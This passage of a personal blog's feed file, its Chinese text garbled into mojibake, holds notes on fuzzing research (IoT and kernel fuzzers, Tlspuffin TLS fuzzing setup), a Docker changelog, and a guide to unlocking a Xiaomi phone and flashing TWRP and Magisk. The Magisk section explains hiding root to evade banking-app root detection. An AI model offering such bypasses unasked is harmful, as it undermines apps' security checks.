å¯†)æ¥æ”¹å˜æµ‹è¯•ç”¨ä¾‹(å°¤å…¶æ˜¯æ¶ˆæ¯å­—æ®µ),å°±èƒ½å¤Ÿæœ‰æ•ˆåœ°å¯¹ç‰©è”ç½‘ç›®æ ‡è¿›è¡Œæ¨¡ç³Šæµ‹è¯•,è€Œæ— éœ€ä¾èµ–äºæœ‰å…³å…¶åè®®è§„èŒƒçš„ä»»ä½•çŸ¥è¯†ï¼</p></blockquote><ol start="2"><li><p>ç‰©è”ç½‘è®¾å¤‡è¿œè¿œæ— æ³•æ»¡è¶³æ¨¡ç³Šæµ‹è¯•éœ€è¦çš„ååç‡</p><blockquote><p>å¤šé¡¹ç ”ç©¶æˆæœè¡¨æ˜ç‰©è”ç½‘è®¾å¤‡é‡‡ç”¨å…¨ä»¿çœŸçš„ç³»ç»Ÿ,å¯ä»¥è·å¾—æœ€é«˜çš„ååé‡,è¿™æ˜¯å› ä¸ºçœŸå®çš„ç‰©è”ç½‘è®¾å¤‡ç›¸æ¯”äºæ¡Œé¢å·¥ä½œç«™æˆ–è€…æœåŠ¡å™¨è¦æ…¢å¾—å¤š</p></blockquote></li></ol><h3 id="å†…æ ¸å®‰å…¨ä¸­çš„æ¨¡ç³Šæµ‹è¯•">å†…æ ¸å®‰å…¨ä¸­çš„æ¨¡ç³Šæµ‹è¯•</h3><p>å†…æ ¸æ¨¡ç³Šæµ‹è¯•é€šå¸¸åˆ©ç”¨æš´éœ²å‡ºæ¥çš„ç³»ç»Ÿè°ƒç”¨æ¥å£å’Œå¤–å›´æ¥å£,ä»ç”¨æˆ·ç©ºé—´è¿›å…¥åˆ°å†…æ ¸ç»„ä»¶ä¸­è¿›è¡Œæ¨¡ç³Šæµ‹è¯•,ä»¥æ£€æµ‹å†…æ ¸ä¸­å¯èƒ½å­˜åœ¨çš„æ¼æ´</p><p>ä¸»è¦é¢ä¸´çš„é—®é¢˜:</p><ol><li>Windowså†…æ ¸ç¨‹åºä»¥åŠå¾ˆå¤šç›¸å…³ç»„ä»¶çš„æºä»£ç å¹¶ ä¸å¼€æº,å°†å¯¼è‡´ä¼ ç»Ÿçš„åé¦ˆæœºåˆ¶ä¸å†é€‚ç”¨ï¼</li><li>å†…æ ¸ä¸­çš„ä»£ç ç”±äºå­˜åœ¨ä¸­æ–­ã€å¤šçº¿ç¨‹æ“ä½œç­‰æœºåˆ¶,ä½¿å¾—æ¨¡ç³Šæµ‹è¯•å˜çš„å¾ˆå¤æ‚ï¼</li><li>å†…æ ¸æ¨¡ç³Šæµ‹è¯•ä¸€æ—¦æ£€æµ‹åˆ°ç¨‹åºçš„å´©æºƒ,å°†ä¼šå¯¼è‡´æ•´ä¸ªæ“ä½œç³»ç»Ÿé‡æ–°å¯åŠ¨,æå¤§åœ°å½±å“äº†æ¨¡ç³Šæµ‹è¯•çš„æ•ˆç‡ï¼</li></ol><blockquote><p>ä¸ºäº†å…‹æœè¿™äº›é—®é¢˜,äº§ç”Ÿäº†ä¸€äº›ä¸“é—¨é’ˆå¯¹å†…æ ¸å®‰å…¨è¿›è¡Œæ¨¡ç³Šæµ‹è¯•çš„ç ”ç©¶,</p><p>æ¯”å¦‚syzkaller [ï¼—ï¼] æ˜¯ç”±Googleå¼€å‘çš„ä¸€ç§ä»¥è·å¾—é«˜è¦†ç›–ç‡ä¸ºå¯¼å‘çš„å†…æ ¸ æ¨¡ç³Šæµ‹è¯•å·¥å…·,ç›®å‰å®é™…ä½¿ç”¨æ¯”è¾ƒå¤š,å¹¶ç»å¸¸è¢«ç”¨äºå¯¹æ¯”å®éªŒä¸­ï¼</p><p>Razzer[ï¼—ï¼‘] æ˜¯åŸºäºsyzkaller [ï¼—ï¼] é€šè¿‡ä½¿ç”¨LLVMå’Œä¿®æ”¹åçš„SVFæŠ€æœ¯é’ˆå¯¹å†…æ ¸ä¸­å­˜åœ¨çš„æ•°æ®äº‰ç”¨é—®é¢˜è¿›è¡Œçš„æ¨¡ç³Šæµ‹è¯•</p><p>TriforceAFL[ï¼“ï¼–] AFL [ï¼‘ï¼“]çš„QEMUæ¨¡å¼,åœ¨ç³»ç»Ÿæ¨¡æ‹Ÿå™¨çš„å¸®åŠ©ä¸‹,é€šè¿‡è·Ÿè¸ªåˆ†æ”¯ä¿¡æ¯,å¯¹Linuxçš„å†…æ ¸è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼</p><p>kAFL[ï¼“ï¼—] é€šè¿‡åˆ©ç”¨Intelæä¾›çš„è¿›ç¨‹è¿½è¸ªæŠ€æœ¯,è·å–ä»£ç è¿è¡Œæ—¶çš„æ§åˆ¶æµä¿¡æ¯,å¹¶é€šè¿‡ä½¿ç”¨Intelçš„ç¡¬ä»¶ è™šæ‹Ÿç‰¹å¾(VTï¼§x)æå‡æ•ˆç‡å¹¶ä½¿å¾—kAFL[ï¼“ï¼—] ç‹¬ç«‹äºç‰¹å®šçš„æ“ä½œç³»ç»Ÿ</p></blockquote><blockquote><p>ä¼ ç»Ÿçš„æ¨¡ç³Šæµ‹è¯•åº”ç”¨åˆ°å†…æ ¸æ¨¡ç³Šæµ‹è¯•ä¸Šå°†é¢ä¸´ç€ä¼—å¤šçš„é—®é¢˜,åŒ… æ‹¬å†…æ ¸æ€ä»£ç çš„å¤æ‚æ‰§è¡Œç¯å¢ƒ,ä»¥åŠå†…æ ¸å´©æºƒçš„å¤„ ç†é—®é¢˜ï¼å¦å¤–å†…æ ¸å®‰å…¨é¢ä¸´çš„å¨èƒæ¥æºæ˜¯ä¸ç¡®å®šçš„, å¯ä»¥æ˜¯å¤–éƒ¨å›ºä»¶,ä¹Ÿå¯ä»¥æ˜¯ç¬¬ä¸‰æ–¹å¼€å‘çš„é©±åŠ¨ç¨‹åº, è¿˜å¯ä»¥æ˜¯å†…æ ¸ç¨‹åºè‡ªèº«è®¾è®¡çš„é—®é¢˜ï¼æ¨¡ç³Šæµ‹è¯•åœ¨å†… æ ¸å®‰å…¨é¢†åŸŸçš„åº”ç”¨è¿˜æœ‰å¾…è¿›ä¸€æ­¥çš„ç ”ç©¶ï¼</p></blockquote><p>é™æ€åˆ†ææˆ–æ¨¡ç³Šæ£€æµ‹æŠ€æœ¯é€šå¸¸å¯¹å†…å­˜æº¢å‡ºç­‰æ¼æ´æœ‰æ•ˆ,è€Œæ— æ³•æŒ–æ˜åè®®å®ç°åº“çš„é€»è¾‘æ¼æ´.</p><p>é€šè¿‡æå–å®‰å…¨åè®®å®ç°çš„çŠ¶æ€æœº,èƒ½å¤Ÿå®ç°å¯¹åè®®å®ç°çš„å½¢å¼åŒ–å»ºæ¨¡.</p></div>]]></content>
      
      
      <categories>
          
          <category> Master </category>
          
          <category> è®ºæ–‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzing </tag>
            
            <tag> è®ºæ–‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tlspuffin-Docker:changelog</title>
      <link href="/posts/95953aea/"/>
      <url>/posts/95953aea/</url>
      
        <content type="html"><![CDATA[<div class="timeline"><div class="timenode"><div class="meta"><p><p><code>1.6.0</code></p></p></div><div class="body"><ul><li>ä¿®å¤deps/rust-openssl-src æ–‡ä»¶æƒé™<ul><li><code>util/dmod</code> æƒé™é—®é¢˜</li></ul></li><li>ä¿®å¤ <code>makedepend: not found</code><ul><li>apt-get install xutils-dev</li></ul></li><li>ä¿®æ”¹ä¸»ç‰ˆæœ¬å·</li><li>puståˆ°dcokerhub</li><li>ç¨³å®šç‰ˆæœ¬</li></ul></div></div><div class="timenode"><div class="meta"><p><p><code>1.3.0</code> - <code>1.5.0</code></p></p></div><div class="body"><ul><li>ä¿®å¤ç¼–è¯‘é”™è¯¯</li></ul></div></div><div class="timenode"><div class="meta"><p><p><code>1.2.0</code></p></p></div><div class="body"><ul><li>å¢åŠ openssl1.01fçš„ä¾èµ–</li></ul></div></div><div class="timenode"><div class="meta"><p><p><code>1.1.0</code></p></p></div><div class="body"><ul><li>å¢åŠ openssl1.01fæ”¯æŒ</li></ul></div></div><div class="timenode"><div class="meta"><p><p><code>1.0.0</code></p></p></div><div class="body"><ul><li>ç§»æ¤åˆ°dockerä¸­</li><li>åˆå§‹src</li></ul></div></div></div>]]></content>
      
      
      <categories>
          
          <category> Master </category>
          
          <category> è®ºæ–‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Master </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tlspuffin åˆ‡æ¢LUTç‰ˆæœ¬</title>
      <link href="/posts/ed5ef6e5/"/>
      <url>/posts/ed5ef6e5/</url>
      
        <content type="html"><![CDATA[<h2 id="è¯´æ˜">è¯´æ˜</h2><div class="story post-story"><p><strong>å½“å‰çš„ç¼ºé™·</strong></p><p>åªæœ‰<code>openssl1.1.1k</code> å’Œ<code>libressl</code>ï¼ˆå­˜ç–‘) æ”¯æŒ<code>Security Violation Oracle</code></p><blockquote><p>æ–‡çŒ®8.2.2èŠ‚</p><p><strong>Improved Security Violation Oracle</strong></p><p>In Section 5.2 we designed a bug oracle which is able to check security properties. Right now we only check after successful handshakes whether no security violation happened. For example whether a downgrade or authentication bypass happened. This could be extended by also verifying invariants during the execution of a handshake. That way we could for example detect the FREAK vulnerability automatically.</p><p>Furthermore, the security violation oracle could also be extended to other TLS implementations.<br><font color='red'><strong>Right now only OpenSSL 1.1.1k is supported</strong>.</font> Support for checking security violations could be ported to LibreSSL 3.3.3 and backported to OpenSSL 1.0.x.</p></blockquote><p>é‚£ä¹ˆåˆ‡æ¢åˆ°å…¶ä»–ç‰ˆæœ¬çš„æ—¶å€™ï¼Œæš‚æ—¶ä¸èƒ½ä½¿ç”¨<code>Oracle</code></p></div><h2 id="depsçš„å…³ç³»">depsçš„å…³ç³»</h2><div class="story post-story"><p><img src="https://s2.loli.net/2022/03/04/O32BfHNia9tK8eh.png" class="lazyload" data-srcset="https://s2.loli.net/2022/03/04/O32BfHNia9tK8eh.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220304204130691"></p><ol><li>Tlspuffin é¡¶å±‚ Cargo.tomlä¸­å®šä¹‰ featuresä¸­<code>openssl</code>ç‰ˆæœ¬, ä»¥åŠä¾èµ–<code>rust-openssl/openssl</code></li><li><code>rust-openssl/openssl</code> Cargo.tomlä¸­å®šä¹‰<code>vendored-openssl</code>ç‰ˆæœ¬ï¼Œä»¥åŠä¾èµ–<code>openssl-sys</code></li><li><code>openssl-sys</code>  Cargo.tomlä¸­å®šä¹‰ç»†åŒ–çš„<code>vendored-openssl</code>ç‰ˆæœ¬ï¼Œä»¥åŠä¾èµ–<code>openssl-srs</code></li></ol><pre class="language-none"><code class="language-none">åŠŸèƒ½: cfgå®šä¹‰å¯¹åº”çš„opensslç‰ˆæœ¬ç»‘å®šè·¯å¾„: src&#x2F;openssl_binding.rs&#x2F;fn create_openssl_serveråŠŸèƒ½: å®šä¹‰featureså¯¹åº”çš„ç‰ˆæœ¬æºç ä½ç½®è·¯å¾„: deps&#x2F;rust-openssl-src&#x2F;src&#x2F;lib.rs&#x2F;fn source_dir</code></pre></div><h2 id="æ­¥éª¤">æ­¥éª¤</h2><div class="story post-story"><ol><li><code>rust-openssl-src</code> æ–‡ä»¶å­˜æ”¾ opensslçš„å„ç‰ˆæœ¬æºç </li><li>ä¿®æ”¹<code>Tlspuffin </code>é¡¶å±‚<code>Cargo.toml</code> æ·»åŠ ç‰ˆæœ¬åç§°</li><li>æ ¹æ®ä¾èµ–ä¾æ¬¡æ·»åŠ ç‰ˆæœ¬ä¿¡æ¯</li><li>åœ¨ä¸¤ä¸ªè·¯å¾„æ–‡ä»¶ä¸­æ·»åŠ å¯¹åº”çš„ä¿¡æ¯</li></ol></div><h2 id="ç¼–è¯‘å…¶ä»–ç‰ˆæœ¬">ç¼–è¯‘å…¶ä»–ç‰ˆæœ¬</h2><div class="story post-story"><p><strong>æ–¹å¼ä¸€ï¼š</strong></p><p>ä¿®æ”¹ é¡¶å±‚<code>Cargo.toml</code> æ–‡ä»¶ä¸­ [features] é¡¹ä¸­ default å‚æ•°</p><pre class="language-toml" data-language="toml"><code class="language-toml"><span class="token punctuation">[</span><span class="token table class-name">features</span><span class="token punctuation">]</span><span class="token key property">default</span> <span class="token punctuation">=</span> <span class="token punctuation">[</span><span class="token string">"sancov_libafl"</span><span class="token punctuation">,</span> <span class="token string">"openssl111j"</span><span class="token punctuation">,</span> <span class="token string">"introspection"</span><span class="token punctuation">]</span></code></pre><p><strong>æ–¹å¼äºŒï¼š</strong></p><p>ä½¿ç”¨<code>cargo </code> å‘½ä»¤ æ·»åŠ å‚æ•°</p><pre class="language-shell" data-language="shell"><code class="language-shell">$ cargo run --no-default-features --features openssl102u,sancov_libafl,introspection</code></pre><blockquote><p>sancov_libafl,introspection å¿…é¡»é¡¹</p></blockquote></div>]]></content>
      
      
      <categories>
          
          <category> Master </category>
          
          <category> è®ºæ–‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Master </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Miui13-mi10såˆ·twrpå’ŒMagisk</title>
      <link href="/posts/9d7955fe/"/>
      <url>/posts/9d7955fe/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2><div class="story post-story"><p>å¾…æ‰‹æœºè§£é”BLé”å,</p><p>å°è¯•å¼€å§‹åˆ·æœº</p><p>ç›®æ ‡:</p><ol><li>åˆ·SkyMiæ˜Ÿç©ºåŒ…-<code>miui13</code> å®˜æ”¹åŒ…é«˜çº§åŒ…</li><li>åˆ·å…¥<code>Magisk v24.1</code>é¢å…·</li><li>ä»¥åŠEDXP,å®ç°ç»•è¿‡<code>ROOT</code>æ£€æµ‹</li></ol></div><h2 id="æ­¥éª¤">æ­¥éª¤</h2><div class="story post-story"><h3 id="è§£BLé”">è§£BLé”</h3><p><strong>å‰ææ¡ä»¶</strong></p><ul><li>æ‰‹æœºä¸è´¦å·ç»‘å®š168h</li><li>ç”µè„‘å®‰è£…å¥½ç›¸åº”çš„adbé©±åŠ¨</li><li>ç”µè„‘å®‰è£…å¥½mifashé©±åŠ¨</li></ul><p>è¿æ¥æ‰‹æœºï¼Œæ‰‹æœºè®¾ç½®<code>usbè°ƒè¯•</code>å, å¼€å¯<code>OEMè°ƒè¯•</code> åœ¨<code>platform-tools</code>ç›®å½•ä¸‹</p><p>å…ˆæŸ¥çœ‹æ˜¯å¦è¿æ¥æˆåŠŸ</p><pre class="language-shell" data-language="shell"><code class="language-shell">$./adb.exe devices</code></pre><p>è¿›å…¥<code>fastboot</code>æ¨¡å¼</p><pre class="language-shell" data-language="shell"><code class="language-shell">$./adb.exe <span class="token function">reboot</span> bootloader</code></pre><p>ç”µè„‘è¿›å…¥miflash ç™»å½•è´¦å·åè¿›è¡Œè§£é”</p><h3 id="åˆ·å…¥Twrp">åˆ·å…¥Twrp</h3><p><strong>å‰ææ¡ä»¶</strong></p><ul><li>BLå·²è§£é”</li><li>éœ€è¦PC /ç¬”è®°æœ¬ç”µè„‘å’ŒUSBæ•°æ®çº¿</li><li>ç”µè„‘å®‰è£…å¥½ç›¸åº”çš„adbé©±åŠ¨</li><li>ç”µè„‘å®‰è£…å¥½mifashé©±åŠ¨</li><li>æå‰ä¸‹è½½å¥½å¯¹åº”çš„<code>Twrp</code>ç‰ˆæœ¬</li><li>æå‰åšå¥½å¤‡ä»½</li><li>æ‰‹æœºæœ‰è¶³å¤Ÿçš„ç”µé‡</li><li>USB Drivers: <a href="https://www.getdroidtips.com/download-latest-xiaomi-usb-drivers/">Xiaomi USB Drivers</a></li><li><a href="https://www.getdroidtips.com/download-adb/">Download ADB and Fastboot</a> and install them on your PC</li></ul><p><strong>TWRP Recovery Details</strong></p><table><thead><tr><th>File Name</th><th>TWRP Recovery</th></tr></thead><tbody><tr><td>Version</td><td>3.6.0</td></tr><tr><td>Support</td><td>Unofficial</td></tr><tr><td>Developer</td><td><a href="https://forum.xda-developers.com/m/theromfan.11952709/">TheRomFan</a></td></tr></tbody></table><p>è¿æ¥æ‰‹æœºï¼Œæ‰‹æœºè®¾ç½®<code>usbè°ƒè¯•</code>å,å¼€å¯<code>OEMè°ƒè¯•</code> åœ¨<code>platform-tools</code>ç›®å½•ä¸‹</p><ol><li>è¿›å…¥<code>fastboot</code>æ¨¡å¼</li></ol><pre class="language-shell" data-language="shell"><code class="language-shell">$./adb.exe <span class="token function">reboot</span> bootloader</code></pre><ol start="2"><li>æŸ¥çœ‹<code>fastboot</code>è®¾å¤‡ä¿¡æ¯</li></ol><pre class="language-shell" data-language="shell"><code class="language-shell">$./fastboot.exe devices</code></pre><p><strong>Devices with A/B partition scheme</strong></p><p>twrp.imgä¸ºä¸‹è½½çš„twrpåç§°</p><ol start="3"><li>åˆ·å…¥boot ï¼Œ ä¸´æ—¶è¿›å…¥twrp</li></ol><pre class="language-shell" data-language="shell"><code class="language-shell">$./fastboot.exe boot twrp.img</code></pre><ol start="4"><li>å°†twrp.imgæ–‡ä»¶å¤åˆ¶åˆ°è®¾å¤‡</li></ol><pre class="language-shell" data-language="shell"><code class="language-shell">$ ./adb.exe push twrp.img /sdcard</code></pre><ol start="5"><li>è¿›å…¥åˆ°twrpä¸­</li></ol><pre class="language-shell" data-language="shell"><code class="language-shell">$./fastboot.exe oem reboot-recovery</code></pre><ol start="6"><li>é€‰æ‹© <code>Install Recovery Ramdisk</code></li></ol><p><img src="https://s2.loli.net/2022/03/08/gM71anPeEkvd8tO.jpg" class="lazyload" data-srcset="https://s2.loli.net/2022/03/08/gM71anPeEkvd8tO.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Install recovery ramdisk option under TWRP"></p><ol start="7"><li>é€‰æ‹©åˆšåˆšå¤åˆ¶è¿›å»çš„<code>twrp.img</code></li><li>é‡å¯recovery</li></ol><h3 id="å®‰è£…Magisk">å®‰è£…Magisk</h3><p><font color='red'>magisk rootæƒé™çš„æ­£ç¡®è·å¾—æ–¹æ³•æ˜¯ä¿®è¡¥ä½ ç›®å‰ç³»ç»Ÿçš„bootï¼Œå†é€šè¿‡ç”µè„‘adbå‘½ä»¤åˆ·å…¥ä¿®è¡¥åçš„bootã€‚</font></p><p><font color='cornflowerblue'>é”™è¯¯æ–¹æ³•: å…ˆè·å¾—å®˜æ–¹rootæƒé™ï¼Œå†ç»™magisk manageræƒé™æ¥è®©å…¶ç›´æ¥åˆ·å…¥magiskæ¥è·å¾—rootæƒé™ã€‚</font></p><blockquote><p>é¦–å…ˆè¦æœ‰ä¸€ä¸ªæ¦‚å¿µï¼Œå°ç±³11ï¼ˆåæ–‡å‡ä»£æŒ‡å‡ºå‚å°±æ˜¯å®‰å“11ï¼‰çš„æ‰‹æœºä¸ä¹‹å‰çš„å°ç±³/çº¢ç±³æ˜¯ä¸ä¸€æ ·çš„ï¼ˆå“ªæ€•åæ¥ä»10å‡çº§äº†å®‰å“11ï¼‰ï¼Œå°ç±³11ä½¿ç”¨çš„æ˜¯V a/bçš„åˆ†åŒºå½¢å¼ã€‚ä¸åŒäºå…¶ä»–æ‰‹æœºï¼Œå…¶ä»–æ‰‹æœºçš„å¯åŠ¨æµç¨‹å›¾å¯ä»¥å¤§è‡´å‚è€ƒä¸€ä¸‹</p></blockquote><p><img src="https://s2.loli.net/2022/03/01/aK9d4kNcVB1AM6b.jpg" class="lazyload" data-srcset="https://s2.loli.net/2022/03/01/aK9d4kNcVB1AM6b.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p><ol><li><p>æ‹¿åˆ°<code>boot.img</code></p><p>æ–°ç‰ˆæœ¬éœ€è¦å…ˆè§£å‹payload.binï¼Œç„¶åéœ€è¦ä¸€ä¸ªå·¥å…·æ¥äºŒæ¬¡è§£åŒ…å·¥å…·åœ¨è¿™é‡Œ <a href="aili.lanzoux.com/ii2lkkp079g">aili.lanzoux.com/ii2lkkp079g</a>å¯†ç :5b8x)<br>è¿™ä¸ªå·¥å…·å¾ˆç®€å•ï¼ŒåŒ…é‡Œä¹Ÿæœ‰readmeï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯æŠŠpayload.binæ”¾å…¥inputï¼Œè¿è¡Œexeï¼Œåˆ°outputå»æ‰¾è§£å‹å‡ºçš„boot.imgåŒ…å°±è¡Œ</p></li><li><p>æ‰‹æœºä¸Šå®‰è£…Magisk Manager</p><p>å°†åˆšåˆšæå–åˆ°çš„boot.imgç§»åˆ°æ‰‹æœºé‡Œï¼Œæ‰“å¼€æ¢¯æˆ–è€…æ›´æ”¹é¢å…·çš„è‡ªå®šä¹‰é€šé“ï¼Œ</p><p>ç„¶åå›åˆ°ä¸»ç•Œé¢é€‰æ‹©Magiskçš„å®‰è£…</p><p><img src="https://s2.loli.net/2022/03/01/GkaoXV1PgrcYqNM.jpg" class="lazyload" data-srcset="https://s2.loli.net/2022/03/01/GkaoXV1PgrcYqNM.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p></li><li><p>Magiskå®‰è£…</p><p>æ­¤å¤„é€‰æ‹©å¹¶ä¿®è¡¥ä¸€ä¸ªæ–‡ä»¶ï¼Œé€‰æ‹©åˆ°åˆšåˆšç§»å…¥æ‰‹æœºçš„boot.imgï¼Œç­‰å¾…ä¿®è¡¥å®Œæˆï¼Œåœ¨åŒç›®å½•ä¸‹ä¼šç”Ÿæˆboot_patch.imgæ–‡ä»¶ã€‚</p><p>æ­¤å¤„ä¸å¯é€‰æ‹©ç›´æ¥å®‰è£…ï¼ˆæ¨èï¼‰ï¼ŒåŸå› åé¢ä¼šè¯´</p></li><li><p>å°†è¿™ä¸ªä¿®è¡¥çš„boot_patch.imgç§»å›ç”µè„‘ã€‚å¼€å§‹çº¿åˆ·ï¼Œ</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token variable">$fastboot</span> flash boot_a boot_patched.img<span class="token variable">$fastboot</span> flash boot_b boot_patched.img</code></pre></li></ol><p><strong>ä¸ºä»€ä¹ˆé¢å…·ä¸èƒ½é€‰æ‹©ç›´æ¥å®‰è£…ï¼ˆæ¨èï¼‰ï¼Ÿ</strong></p><p>å¦‚æœä½ æå‰å·²ç»è·å–äº†å®˜æ–¹Rootï¼Œè¿™ä¸€æ­¥ä½ å½“ç„¶å¯ä»¥æ­£å¸¸è¿è¡Œå¹¶ä¸”åˆ·å¥½é¢å…·ã€‚ä½†ä¸ºäº†ç»•è¿‡é“¶è¡Œç­‰APPRootæ£€æµ‹ï¼Œä½¿çš„Magiskhideæ­£å¸¸å‘æŒ¥ä½œç”¨ã€‚ä½¿ç”¨å®˜æ–¹Rootè·å–åˆ°é¢å…·ï¼Œé¢å…·æ¥ç®¡äº†ä½ çš„å®˜æ–¹Rootï¼Œå½“ä½ ä½¿ç”¨hideæ—¶ï¼Œé¢å…·çš„Rootè¢«éšè—äº†ï¼Œå®˜æ–¹çš„Rootå°±æ¢å¤äº†ï¼ˆå¯¹è¯¥åº”ç”¨ï¼‰ã€‚æ‰€ä»¥åº”ç”¨èƒ½æ£€æµ‹å‡ºRootï¼Œè€Œä¸”å¾ˆéš¾å†æŠŠå®˜æ–¹Rootå»éšè—ã€‚æœ¬æ•™ç¨‹å‹æ ¹å°±ä¸åˆ·å®˜æ–¹Rootç›´æ¥è·å–é¢å…·Rootï¼Œæ‰€ä»¥Magiskhideèƒ½æ­£å¸¸å‘æŒ¥ä½œç”¨ï¼ˆå¹¶ä¸”å¤§å¤šæ•°æƒ…å†µæ˜¯ç»å¯¹å¤Ÿç”¨çš„ï¼‰ã€‚<br>ä½ å½“ç„¶ä¹Ÿèƒ½å†åˆ·ä¸€ä¸ªæŸæŸé“¶è¡Œå»Rootçš„æ¨¡å—ï¼Œä½†æ˜¯ä¸éº»çƒ¦ä¹ˆï¼Ÿæ˜æ˜è‡ªå¸¦çš„è…¿å°±èƒ½å‘æŒ¥ä½œç”¨ï¼Œä½ å…ˆç æ–­ä»–çš„è…¿åœ¨ç»™ä»–æ¥ä¸Šï¼Œè¿™ä¸æ˜¯å¤šæ­¤ä¸€ä¸¾ï¼Ÿè€Œä¸”æ¨¡å—è¶Šå¤šç¨³å®šæ€§å•Šè½¯ä»¶æ›´æ–°å•Šéƒ½æ˜¯é—®é¢˜ã€‚ä¸€åŠ³æ°¸é€¸çš„æ–¹æ³•ä¸å¥½ä¹ˆï¼Ÿ</p><h3 id="Magisk-éšè—ç”Ÿæ•ˆ">Magisk éšè—ç”Ÿæ•ˆ</h3><p>[å¡«å‘]</p></div><h2 id="æ˜Ÿç©ºROMåŒ…">æ˜Ÿç©ºROMåŒ…</h2><div class="story post-story"><blockquote><p>ç»è¿‡æµ‹è¯•åï¼Œ æ˜Ÿç©ºé›†æˆçš„ROMåŒ…ä¸Twrpæ— æ³•åŒæ—¶å­˜åœ¨</p><ol><li>åˆ·å…¥Twrpåï¼Œ ä½¿ç”¨Twrpå¡åˆ·ROMåï¼Œtwrpä¼šè‡ªåŠ¨å›æ»šæˆå®˜æ–¹recovery <font color="red">æ²¡åˆ·å†…æ ¸çš„åŸå› ã€‚</font></li><li>æ˜Ÿç©ºROMè‡ªåŠ¨çº¿åˆ·å¡åˆ·ä¸¤ç§æ–¹å¼ï¼Œé›†æˆMagiskã€‚ æ‰€ä»¥æ²¡æœ‰å¿…è¦ä½¿ç”¨Twrp</li></ol></blockquote><p>å‰æï¼š</p><ol><li>å®‰è£…å¥½usbé©±åŠ¨</li><li>å®‰è£…å¥½adbå‘½ä»¤</li></ol><p>ä¸´æ—¶ä½¿ç”¨Twrpæ–¹å¼ï¼š</p><pre class="language-shell" data-language="shell"><code class="language-shell">$./fastboot.exe boot twrp.img</code></pre><p>è¿›å…¥Twrp</p><pre class="language-shell" data-language="shell"><code class="language-shell">$./fastboot.exe oem reboot-recovery</code></pre></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Win </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastboot </tag>
            
            <tag> é©±åŠ¨ </tag>
            
            <tag> miflash unlock </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è§£å†³Win10 Fastbooté©±åŠ¨é—®é¢˜</title>
      <link href="/posts/c1ff5c7b/"/>
      <url>/posts/c1ff5c7b/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2><div class="story post-story"><p>å°ç±³æ‰‹æœºè§£é”BL,</p><p>ä½¿ç”¨ä»å®˜ç½‘ä¸‹è½½çš„<a href="http://miuirom.xiaomi.com/rom/u1106245679/6.5.224.28/miflash_unlock-6.5.224.28.zip">è§£é”å·¥å…·</a> (miflash_unlock-6.5.224.28 ç‰ˆæœ¬è‡ªèº«ä¸å¸¦win10 é©±åŠ¨)å¯¼è‡´å‡ºç°å³ä½¿è¿æ¥æ‰‹æœºåä¹Ÿæ˜¾ç¤º: <font color='red'>å½“å‰æœªè¿æ¥æ‰‹æœº</font></p><p><img src="https://s2.loli.net/2022/03/01/D5NLZIfz3wmEkJP.png" class="lazyload" data-srcset="https://s2.loli.net/2022/03/01/D5NLZIfz3wmEkJP.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220301173447180"></p></div><h2 id="è§£å†³æ–¹æ³•">è§£å†³æ–¹æ³•</h2><div class="story post-story"><p>ä¸‹è½½é©±åŠ¨:  <a href="https://github.com/xushuan/google_latest_usb_driver_windows">google_latest_usb_driver_windows</a></p><p>è§£å‹åç›®å½•ä¸‹æœ‰ä¸ª: <code>android_winusb.inf</code> æ–‡ä»¶</p><ol><li><p>æ‰“å¼€è®¾å¤‡ç®¡ç†å™¨</p></li><li><p>å…¶ä»–è®¾å¤‡é‡Œæ‰¾åˆ° <code>Android</code>ç±»ä¼¼å¸¦æœ‰!ä¸æ­£å¸¸é©±åŠ¨</p></li><li><p>æ›´æ–°é©±åŠ¨ç¨‹åº-&gt;æµè§ˆæˆ‘çš„è®¡ç®—æœºä»¥æŸ¥æ‰¾é©±åŠ¨ç¨‹åº</p></li><li><p>è®©æˆ‘ä»è®¡ç®—æœºä¸Šçš„å¯ç”¨é©±åŠ¨ç¨‹åºåˆ—è¡¨é€‰å–-&gt;ä¸‹ä¸€æ­¥-&gt;ä»ç£ç›˜å®‰è£…</p></li><li><p><img src="https://s2.loli.net/2022/03/01/LMuSJy7ZXcKI3eO.png" class="lazyload" data-srcset="https://s2.loli.net/2022/03/01/LMuSJy7ZXcKI3eO.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p></li><li><p><img src="https://s2.loli.net/2022/03/01/Dsx7yudQF1mY83E.png" class="lazyload" data-srcset="https://s2.loli.net/2022/03/01/Dsx7yudQF1mY83E.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p></li><li><p>é€‰æ‹©ä»ç£ç›˜å®‰è£…</p></li><li><p>é€‰æ‹©<code>android_winusb.inf</code>æ–‡ä»¶</p></li><li><p>ä¸‹ä¸€æ­¥å®‰è£…ç­‰å¾…å®‰è£…å®Œæˆåå³å¯</p></li><li><p>åˆ·æ–°å…¶ä»–è®¾å¤‡, 